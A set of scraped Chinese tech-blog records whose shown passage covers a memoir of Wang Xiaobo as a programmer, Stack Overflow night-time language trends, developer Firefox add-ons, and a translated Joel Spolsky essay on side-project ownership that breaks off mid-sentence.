的体系和 DOS大相径庭。全部都很陌生。而且完全抛弃了DOS 那套东西。所有 90 年代 DOS 底层程序员向 WIN32 的迁徙都是一部血泪史。</p>\n<p>他人生最后一年，多媒体开始普及。光驱、声卡、2D 加速卡普及。95~96 年他开始和我合计做多媒体出版。原因现在想起来很悲伤 —— 他的书很难在大陆出版 。 他不得不想办法让他的作品能够让更多人看见。而平时维持生计，只能忍着严重的痔疮，每日给各种杂志写杂文稿件。 多媒体的兴起，让他感觉也许利用他的技术优势，自行制作电子出版物。配上插图，音乐，用电子书籍方式可以让自己作品为大众所见。他给我看了已经制作了一部分的 DEMO。就和现在用 Micromedia 多媒体制作软件制作的电子多媒体制品很像。电子书内容是黄金时代。有图案的背景。按空格可以翻页。同时有音乐。好像偶尔还会有一点动画的特效（我记不清了） 。但当时的DEMO 完全是他自己用 WIN32 写的 EXE 可执行程序。 他那是从 WIN32 SDK 移植输入法时，基本掌握了消息处理、GDI、窗口控制等方法。还有一些底层的 TRICK。</p>\n<p>我大学后和王小波比较近。那几年每周末都在他母亲家相聚。他母亲 5 个儿女，只有他 1 个人在国内。于是他就经常住在母亲家，怕老人一个人，是个大孝子。母亲家旁边有个筒子楼里 2 间房的小屋，公共厕所和水房，冬天暖气烧得极热。偶尔我会和他住一块。里屋是他的生活起居和写作桌。外屋很小只有张床。他弟弟的孩子和我偶然会睡外屋。印象最深的就是，他烧普洱茶的电炉和玻璃茶壶。里面总是有极浓的茶水，下面沉淀着大量茶叶。估计熬夜就靠那个。</p>\n<p>目睹了他后半截人生（从我记事起到他去世，中间他出过很多年）。感慨很多。王小波有个八叔，当时双手打算盘，无比聪明是个天才。年少夭折。王小波父亲因为搞逻辑学，引起毛泽东注意，被毛接见聊了一下逻辑学的学术相关问题。69 岁心脏病发独自倒在家中过世。王小波去世方式和他父亲一模一样。区别仅在更加年轻。王小波哥哥在受文革影响挖了 10 年煤。后来去美国博士念数理逻辑，解决了一个 100 多年未解的数理逻辑问题。最后的博士毕业论文自己系的教授搞不定，专门找了数学系的教授来看。毕业后他哥哥专心开饭馆挣钱养育 2 个女儿成人。准备财务自由后再著书立传。</p>\n<p>我的最大感慨是，留得青山在，不怕没柴烧。天才也好，资质普通如我也好，人都只有一个人生。王小波妈妈去年 92 岁，10 月刚去世，白发人送走了自己两个儿子，又过了十几年才走。之前得过癌症，靠自己毅力锻炼，恢复了。王小波去世后一年，王小波弟弟又突然去世。当时孩子都没敢告诉老人。老太太感觉不对，但又无法得知真相。只是和我说她的疑心。当时国内只有我一人，只能瞒着。不停劝慰老人没事。老太太喃喃说，“除死无大事，除死无大事啊” 。</p>\n<p>除死无大事。 人生在世，碰到什么坎，都只会是你人生中一个普通的节点。时间一长，什么都会成为过眼云烟。 留份宽心，也许这样导致目标感没有强到能和社会精英逐鹿。但只要有耐心，不怕挫折，假以时日，目标总会实现的。作为一个 42 岁还在以玩游戏看动漫为生活主体的大叔，保持健康和有活力地追求智慧和有趣，做自己热爱的工作，保持善良，做精神自由的人，是我从王小波的人生学到最重要的东西。希望每个喜欢王小波的人，都有自己充实和健康的身体和精神。</p>\n<h3>下面是 <a href=\"https://www.zhihu.com/question/20964366/answer/95130854\" target=\"_blank\">张攀 的分享</a>，伯乐在线已获授权</h3>\n<p>王小波的编程能力肯定是不逊色于同一时期的雷军和马化腾的，那时候雷军刚加入金山，马化腾正去创业的路上，只不过雷军后来成了金山总经理，马化腾当上了CEO，项目能力和商业能力肯定是不及后两人的。90年代有很多中关村的老板邀请过王小波加入公司当程序员，王小波也认真地考虑过，只不过后来觉得写东西更赚钱更有意思，一一回绝了。王小波的才华不限于此，他编剧的电影《东宫西宫》获得过阿根廷国际电影节最佳编剧奖，也入围了戛纳电影节，说不定活到现在在娱乐圈也是一个腕儿。</p>\n<p>其实很多大家确实是多面手，历史上很多数学家文学功底也十分过人，高斯曾经还纠结过人生目标到底选择文学还是数学，语言大家赵元任更是同时精通语言学、数学、物理学、中国音韵学和西方音乐，可谓请棋书画数理哲无一不通，涉猎之广让人折服，君不见美国有数不清的摇滚乐青年痴迷于编程，最后有一方作为。</p>\n<p>王小波的文章读起来不见得多有文采，但透出一股肆意妄为的劲儿，自由洒脱，他精通这么多的东西，比起那些稍有一点能耐就当权力打压别人的人，真是对自由精神最好的注解。（我夹带点私货，把自己曾经写的悼念王小波的文章放上来溜溜吧。）</p>\n<p>———–分割线———–</p>\n<p>王小波的忌日是4月11日，他的妻子李银河说王小波是1997年4月10号晚上去世的。时间不重要，重要的是去缅怀这一伟人。</p>\n<p>多数人知道王小波是小说家，部分人分不清财经作家吴晓波和小说家王小波是不是一回事儿。却很少有人知道王小波可以算的上中国早期的程序员，在90年代初的时候因为国内应用软件缺乏，爱捣鼓东西的王小波利用闲暇时间学习了汇编和C语言，编了中文编辑器和输入法。中文编辑器和输入法任何一个都是大牛级的GEEK才会去尝试的东西，比如求伯君。王小波通过卖软件还挣了些钱，当时很多中观村的老板要拉他入伙，当然写代码这种来钱快的活对屌丝王小波还是有吸引力的，所幸他还是拒绝了人家。</p>\n<p>王小波一个写小说的为什么沦落（/升级）成了程序员？这还得慢慢说。王小波大学在人大学的是贸易，毕业后在人大当了几年老师。后来去了美国匹茨堡大学读经济的研究生，到那老师跟他说你就是一写作的奇才，以后必能称霸华语文坛。老师又说你在我这什么都不用干了，好吃好住，毕业证照发，抓紧时间写小说。学成归国几年后，王小波接着又回到人大做统计学的讲师。</p>\n<p>因为做统计，各种分析工具是必不可少的，以前人手工计算，有了计算机当然最好使用计算机，基本理工科的都知道用MATLAB做个毕设和作业是多么重要。所以当时计算机对王小波的工作是相当重要的，但是90年的时候，软件相当稀缺，电脑又相当不智能。王小波不得不自己写软件，当然开发软件也不是那么简单，所以他先是学会了FORTRAN，汇编，C等各种语言，接着又要学习数据结构，算法的相关知识，还有编译原理。</p>\n<p>在做出中文编辑器和输入法，解决了自己的需求之后，王小波对写软件的兴趣已经没有多少了。因为他觉得写软件可以赚钱，写小说同样也可以赚钱。处于一个程序员的修养，王小波还是不断地从数据结构和算法来优化这两个软件。93年的时候，王小波买了一台286,这在当时是一台奢华无比的机子了，他自己也是这样认为的，高兴得一塌糊涂。不过这台顶配机子还是满足不了王小波的要求，后来他把时间花在了不断地去优化这台机子上面。</p>\n<p>王小波可以算的上是个GEEK。大学学的贸易，后来又学化学，再后来转到了数学系。他的同学形容他解数学题就像杀猪一样，特别来劲，一道一道解决，那感觉可能就像打CS拿人头一样爽。不过解多了也觉得没意思。</p>\n<p>王小波小说里的男主角基本都是理工男，除了天天意淫还有一些奇怪的想法。其中一些还有自己的发明，比如《未来世界》里的王二是个工程师，整天想着和单位一起研制的永动机，还有《红拂夜奔》里的李靖发明过一个巨大的开跟号机器，在战场上，这台机器运转起来挥舞着杠杆边开跟攻击敌人，有的人死在根号3下，有的人倒在了根号5下。这些都只有GEEK才会想得出来。</p>\n<p>王小波干过很多事情，下过乡，考过大学，出过国，学过经济，打过代码，成了小说家，去世的那一年完成了心愿做了编剧。总之不管他干了什么，他身上让我们尊重的还是独立之精神，自由之思想。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111016\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111016votetotal\">4</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111016\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 4 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2014/08/93007774df953a3c852610443251c7f1.jpg"], "fav_nums": 4, "comment_nums": 5, "create_date": "2017/05/05", "praise_nums": 4}
{"tags": " 5 评论 ,编程语言,开发", "front_image_path": "full/e4ef10899dd499cd91f9102bff717ea3d2311bfc.jpg", "title": "程序员晚上最常用的编程语言", "url_object_id": "2ebf0cb8ef412bcdf3dbe0185a87e90b", "url": "http://blog.jobbole.com/110140/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文作者： <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/aoi\">伯小乐</a> 。未经作者许可，禁止转载！<br>欢迎加入伯乐在线 <a href=\"http://blog.jobbole.com/99322\" target=\"_blank\">专栏作者</a>。</div><p>【伯乐在线导读】：Stack Overflow 的<a href=\"https://www.kaggle.com/stackoverflow/stacklite\" target=\"_blank\">公开数据集</a>是个好东西，之前 SO 家程序员 Julia Silge 在 2 月份根据数据集做了一次「<a href=\"http://blog.jobbole.com/110111/\" target=\"_blank\">程序员在周末常用的那些编程语言</a>」。前几日 SO 家程序员 David Robinson 对程序员晚上常用编程语言做了一次分析。</p>\n<p>David 自称，他把编程也当做是一种业余爱好了，并且他还是个夜猫子，所以在工作时间之外也会写代码。不管有多晚，遇到 Bug 了，还是会上 SO。除了 David，全球还有诸多像 David 这样的程序员。所以，在 SO 的公开数据集做筛选分析出晚上的热门 tag，可以进一步了解程序员晚上常用的编程语言。</p>\n<h3>程序员每天什么时间段在访问 SO？</h3>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/63918611gy1feu5yyu167j20sg0hs77c.jpg\"></p>\n<p>David 分析了 2016 年 8 月 4 周的数据。为什么选 8 月份，David 说是为了避开西方大多数的节假日和典型的学年，以减少学生群体带来的影响。（学生可能在晚上做作业，并且用到是另外一套技术栈）。他也查看了美国用户在 8 月份的访问数据，大致相似。</p>\n<p>从上图来看，</p>\n<ol>\n<li>程序员们主要还是在周一到周五的朝九晚五（六）的工作时间中访问 SO；</li>\n<li>并且中午 12 点有个低谷，毕竟是午餐时间嘛；</li>\n<li>周末的访问量，极大低于周一到周五；</li>\n</ol>\n<h3>4 种编程语言每天的变化趋势</h3>\n<p>虽然在前面看了程序员访问 SO 的总体时间分布，但特定编程语言之间，又有差别了。David 选择了 C、C#、Python、JavaScript 四种语言。</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1feu5z2q1rjj20sg0hsgoh.jpg\"></p>\n<p>从上图来看，这 4 种语言总体访问趋势类似。</p>\n<ol>\n<li>从<strong><span style=\"color: #cc99ff;\">紫色</span></strong>曲线图可知：C# 程序员每天开始的最早，结束的也是最早。另外，C# 在晚 6 点到 晚 11 期间用的最少。这也许是因为 C# 多用于金融和企业软件公司，它们通常开始的早，并且有着严格的时间表。</li>\n<li>从<strong><span style=\"color: #ff0000;\">红色</span></strong>曲线图可知：C 程序员每天开始的稍微点，但在晚上一直持续在使用，持续时间最长。这或许表明， C 语言在程序员业余时间当中特受欢迎，或者可能是暑假期间学生做作业呢。</li>\n<li>Python 和 JS 基本是介于 C# 和 C 之间。</li>\n</ol>\n<h3>动图展示不同技术标签的每天变化趋势</h3>\n<p><img class=\"alignnone\" src=\"http://wx2.sinaimg.cn/mw690/63918611gy1feu5zb5mnhg20dc0dcnpd.gif\" width=\"480\" height=\"480\"></p>\n<p>从图中可看出，</p>\n<ol>\n<li>微软的技术（Excel、VBA 和 C#）在每天是「起」的最早，并且在朝九晚五期间保持着领先；</li>\n<li>在下午 5 点左右，开始有了转变，领先位置偏向 C/C++、移动开发技术、特别是 Haskell；</li>\n</ol>\n<h3>为什么 Haskell 程序员晚上会在那么（相对）活跃？</h3>\n<p>这个问题，并不是 David 提出的，是小编提出来的。欢迎大家在评论中留言。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110140\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110140votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110140\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 3 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 5 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">伯小乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/11/f2bb4f6f428a49476a2e91c355c8d150.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/aoi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/aoi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/aoi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 245</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/04/7a91ae8776d0953ac776284a7d92e861.jpg"], "fav_nums": 3, "comment_nums": 5, "create_date": "2017/04/21", "praise_nums": 2}
{"tags": "插件,火狐,IT技术", "front_image_path": "full/94eb57dcbc21939b80cff42e6a576be4647209f7.jpg", "title": "适用于开发者的最佳火狐插件", "url_object_id": "76b5c7b89ab5829e1baafbaaf32495ca", "url": "http://blog.jobbole.com/110941/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://my.oschina.net/editorial-story/blog/881207\">OSC-两味真火</a>   </div><p>嗨…你还记得火狐么？ 谷歌的 Chrome 浏览器现在是浏览器群英中的王者，不过火狐依然独树一帜并且依旧是网页应用开发者最好的浏览器。我知道它稍微有点慢，并且略占内存，不过其各种定制化功能绝对是无懈可击的。我们列举出了一些我们收藏的火狐插件，让我们作为开发者的生活变得更加简单，并且希望它能帮助节省你一点点时间。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180707_dLMf.jpg\" alt=\"firefox add ons for developers\" width=\"669\" height=\"397\"></p>\n<h3><strong>1、<a href=\"https://addons.mozilla.org/en-US/firefox/addon/web-developer\" target=\"_blank\" rel=\"nofollow\">Web Developer</a></strong></h3>\n<p>一个绝对能称之为顶尖的浏览器网页开发工具，Web Developer 是一款不仅仅在Firefox上可用的扩展插件，其还风靡 Chrome，Opera，并且其可以在任何支持上述浏览器的操作系统上运行自如，包括 Windows,OS X, 以及 Linux。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180709_707P.png\" alt=\"best firefox add-ons for developers\"></p>\n<h3><strong>2、<a href=\"https://addons.mozilla.org/en-US/firefox/addon/javascript-deobfuscator/\" target=\"_blank\" rel=\"nofollow\">JavaScript Deobfuscator </a></strong></h3>\n<p>查看并调试 JavaScript，如 JavaScript 本身在有 JavaScript Deobuscator 的页面上编译执行一样。 JavaScript Deobuscator 会为你显示页面上的所有 JavaScript —— 甚至那些在fly上生成并混淆的代码。即使你工作于没有使用混淆的网站，它也是一个很有价值的工具。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180709_a0Tz.png\" alt=\"best firefox add-ons for developers\"></p>\n<h3><strong>3、<a href=\"https://addons.mozilla.org/en-us/firefox/addon/hackbar/\" rel=\"nofollow\">HackBar</a></strong></h3>\n<p>HackBar 是一个简单的安全审核和渗透测试工具，它是所有希望确保其工作安全的开发人员的必备工具。 它并不是一个用来执行标准漏洞的工具，它不会教你如何破解网站，但它可以帮你测试SQL注入，XSS漏洞和站点安全性。 您可以在 <a href=\"https://github.com/johan-adriaans/hackbar\" target=\"_blank\" rel=\"nofollow\">GitHub</a> 查看源代码。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180710_wFF3.png\" alt=\"HackBar\" width=\"400\" height=\"342\"></p>\n<h3><strong>4、<a href=\"https://addons.mozilla.org/en-US/firefox/addon/sqlite-manager/\" rel=\"nofollow\">SQLite Manager</a></strong></h3>\n<p>SQLite Manager 能直接从您的浏览器管理 SQLite 数据库，它提供了大量的功能：包括直观地显示数据库对象的结构树，用于管理表，索引，视图和触发器的有用对话框，具有语法帮助功能的下拉菜单能帮助你更轻松地写 SQL ，还能通过菜单，工具栏，按钮和上下文菜单等直观查看功能和常用操作。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180711_TNhC.png\" alt=\"best firefox add-ons for developers\"></p>\n<h3><strong>5、<a href=\"https://addons.mozilla.org/en-US/firefox/addon/firephp\" rel=\"nofollow\">FirePHP</a></strong></h3>\n<p>FirePHP 让你能够在不干扰实时内容的情况下快速轻松地调试代码。它允许你使用简单的 PHP 方法调用登录到你的 Firebug Console，对于 AJAX 开发人员来说简直是个完美的 Firefox 附加组件。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180719_YGzs.png\" alt=\"best firefox add-ons for developers\"></p>\n<h3><strong>6、<a href=\"https://addons.mozilla.org/en-us/firefox/addon/jsonview/\" target=\"_blank\" rel=\"nofollow\">JSONView</a></strong></h3>\n<p>有了JSONViewAAAA，你可以很容易地查看在浏览器右边查看 JSON 文档。不像火狐提示你下载文件，文档在浏览器中显示如 XML 文档一样。文档以及被格式化并且高亮可收缩的显示了数组和对象，并且即使这个JSON 文本包含错误，JSONView 依旧可以显示其每行文本。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180720_DXUY.png\" alt=\"JSONView\" width=\"354\" height=\"339\"></p>\n<h3><strong>7、<a href=\"https://addons.mozilla.org/en-us/firefox/addon/ghostery/\" rel=\"nofollow\">Ghostery</a></strong></h3>\n<p>如果你访问网站时想要隐身或者大幅提升浏览速度的话，你可以添加 Ghostery  插件。它会让你明智地选择与所访问的网站分享的数据，在你工作时能为你提供一个更干净、更安全、更快速的浏览体验。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180720_Cc70.png\" alt=\"Ghostery\" width=\"400\" height=\"308\"></p>\n<h3><strong>8、<a href=\"https://addons.mozilla.org/en-us/firefox/addon/all-in-one-sidebar/\" rel=\"nofollow\">All-in-One Sidebar</a></strong></h3>\n<p>All-in-One Sidebar 能让你同时打开几个窗口作为侧边栏面板，并能轻松切换它们，包括书签、历史记录，以及对话框、下载、扩展工具、页面信息、错误控制台等对话。它们不会妨碍你的浏览，或者说：你很容易就可以通过开关显示或隐藏它们。而且，你还可以在浏览器启动或者全屏模式时配置这个扩展组件的行为。<a href=\"http://firefox.exxile.net/aios/features.php\" target=\"_blank\" rel=\"nofollow\">点此</a>获取更多该组件的特性。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180721_N5DF.png\" alt=\"All-in-One Sidebar\" width=\"400\" height=\"346\"></p>\n<h3><strong>9、<a href=\"https://addons.mozilla.org/en-us/firefox/addon/resurrect-pages/\" rel=\"nofollow\">Resurrect Pages</a></strong></h3>\n<p>页面崩溃对用户和开发者来说都是令人沮丧的。幸亏有 Resurrect Pages，它能够让死了很久的页面重新复活并继续浏览。这个组件会搜索包括 Google 缓存在内的四个主页缓存/镜像（但并非全部，因为并非所有页面都被缓存）。你可以在 <a href=\"https://github.com/arantius/resurrect-pages\" target=\"_blank\" rel=\"nofollow\">GitHub</a>上查看源代码。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180721_TxGh.png\" alt=\"Resurrect Pages\" width=\"500\" height=\"265\"></p>\n<h3><strong>10、<a href=\"https://addons.mozilla.org/en-US/firefox/addon/fireshot/?src=cb-dl-users\" rel=\"nofollow\">FireShot Pro</a></strong></h3>\n<p>快速抓取整个网页的屏幕截图，并使用FireShot Pro进行注释，这个插件十分有用，你可以快速捕获并保存屏幕截图（为图片或PDF），而且你还可以将屏幕截图发送到剪贴板，打印，添加注释，上传 ，以及用一个简单的工具发送。 请注意，某些功能（添加注释，上传和发送）仅适用于Windows操作系统。</p>\n<p><img class=\"aligncenter\" src=\"https://static.oschina.net/uploads/img/201704/17180722_HUxX.png\" alt=\"best firefox add-ons for developers\"></p>\n<p>除了以上几种，还有<a href=\"http://%20https//stackify.com/chrome-extensions-for-developers/%C2%A0\" target=\"_blank\" rel=\"nofollow\">很多超棒的适用于开发者的火狐插件</a>等着你去探索。你也可以在评论中发表自己的看法，以供更多的开发者交流和学习。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"110941\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"110941votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"110941\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["https://static.oschina.net/uploads/img/201704/17180707_dLMf.jpg"], "fav_nums": 1, "comment_nums": 0, "create_date": "2017/04/20", "praise_nums": 3}
{"tags": "程序员,职场, 3 评论 ", "front_image_path": "full/fff0979e3f646a50f7a2ecbbf51fc0dc1e02c553.jpg", "title": "开发者的副项目 ，归公司所有吗？", "url_object_id": "82e4b98de083bb3fd55167bf3109544f", "url": "http://blog.jobbole.com/111108/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/zhj318\">飞哥的咖啡</a> 翻译，<a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.joelonsoftware.com/2016/12/09/developers-side-projects/\">Joel Spolsky</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>几乎所有受雇于他人的开发者最终都会签订某种“发明专利协议”，然而几乎所有人都误解了这份协议的内容。大多数开发者认为，在工作时间内做的工作属于雇主，但在家中或业余时间做的则属于他们自己。这种错误的认知很危险。</p>\n<p><img id=\"pic\" class=\"M_cur_zoom_out\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ffdu7fxim7j20sg0lcn1h.jpg\" width=\"600\" height=\"450\"></p>\n<p>现在让我们思考一下这个问题︰ 如果你是一名在软件公司工作的开发者，这家公司是否拥有你在业余时间做的副项目（side project）？</p>\n<p>在我开始回答之前，请一定当心那些来自网络的法律建议。我看到了很多的错误信息，足以让你深陷困境。身处美国之外的读者也需要注意，可能当地的法律与法规完全不同。</p>\n<p>回答这个问题，你先需要知道 3 个信息：</p>\n<p><strong>1、你在哪个州（或国家）工作？</strong></p>\n<p>各地法律不同，差异巨大，有些甚至可能会优先于特定的合同。</p>\n<p><strong>2、你与雇主的合同上是怎么写的？</strong></p>\n<p>在美国，一般情况下法院会宽容地让人们签署他们想要的任何合同，但有时，国家法律会明确写到“即使你签署了诸如这样的合同，法律仍具有优先权”。</p>\n<p><strong>3、你是承包商，还是员工？</strong></p>\n<p>在美国，这是两种不同的雇佣方式，而不同情况下法律也不尽相同。但是，在我可以开始解释这些问题之前，我们必须先暂停一下。</p>\n<p>想象一下，你创办了一家软件公司，你需要一名开发者。所以你雇佣了街对面的萨拉，与她做了一笔交易，支付她 $20 时薪，让她给你的软件产品编写代码。她写她的代码，你付给她 $20 时薪，这看起来进行得不错。是吗？</p>\n<p>好吧，可能是的。在美国，如果你雇佣萨拉作为一名承包商，她仍然拥有这份工作的版权。有点奇怪，你可能会说，“听好了，我可是付钱给她的”。尽管听起来很怪，但这就是版权的运作方式。事实上，如果你雇了一位摄影师为你的婚礼拍照，你获得了底片的照片副本，而版权却在摄影师的手上，他可以合法地用这些底片冲印更多的照片复本。很震惊吧！这对代码同样适用。</p>\n<p>每个软件公司都希望拥有员工代码的版权，所以软件公司不能接受法律“默认”的方式。这就是为什么所有管理良好的软件公司，都会要求所有的开发人员至少需要签署一项协议</p>\n<ul>\n<li>以换取工资，</li>\n<li>内容是开发人员同意将版权“转让”（给）公司。</li>\n</ul>\n<p>该协议可以包含在就业合同或单独的“发明专利委派”合同中。这样的方法通常表达为法律意义上的“雇佣工作”（<a href=\"http://en.wikipedia.org/wiki/Work_for_hire\">work for hire</a>），这等同于“我们决定，版权将由公司所有，而非员工”。</p>\n<p>直到这里，我们仍然没有说到业余时间进行的工作。假设，现在你有一个小的游戏公司，业务不是软件制作，而是每隔几个月推出三到四个益智游戏。你不能自己开发所有的游戏。所以你走出公司雇了一个游戏设计师来开发游戏。你要支付游戏设计师 $6,000 月薪来开发新游，它们是益智类的、原创的，并且可以申请专利。作为一家公司，拥有游戏专利极其重要。</p>\n<p>你的游戏设计师工作一年，开发了 7 个游戏。年底她控告你，并声称她拥有其中 4 个游戏，因为这些都是在朝九晚五之外的非工作时间做的。</p>\n<p>糟糕，这不是你雇佣她的本意。你付钱给她是为了她开发的所有游戏，然后你认识到，实际上你支付的时间包含了任何时间…工作日、周末、办公室、小隔间、家中、淋浴以及度假登山时。</p>\n<p>所以，在你雇佣这个开发人员前，你要说，“嘿，听着，我知道你随时会进行开发，我也很难证明你是否在工作时间内完成了开发。我不想只雇佣你在上班时间 9 点到 5 点的开发时间，我要的是你开发用的所有时间。为此，我付你一份不错的薪水。”她同意了你的说法，然后现在你想要签署一份协议，内容是只要她仍在职，她所有的开发成果都属于公司。</p>\n<p>这就是我们现在默认的情况。这也是给开发人员、发明家和研究人员提供的标准雇佣合同。</p>\n<p>即使一家公司突然做出决定，“天哪，我们不想拥有开发人员在非工作时间的开发成果，”他们很快会陷入困境。为何会这样？因为他们可能需要接受投资，而投资者会要求，“请向我证明，你不会被一些心怀不满的离职员工起诉，说你想要卖了他们的开发成果”。公司想要能够列出一张清单，包含所有在职和离职的员工，并展示他们每个人将开发成果授权给公司的合同。对于每个高科技公司的融资、并购和收购等操作而言，做好上述准备是一种应尽的责任。因为没有准备好这些授权合同的软件公司可能会面临融资困难、被并购或被收购的困境，而那个从 1998 年开始不签订协议的人，如果现在签署了协议，他就是一个真正的混蛋，因为他知道自己持有高达 3.5 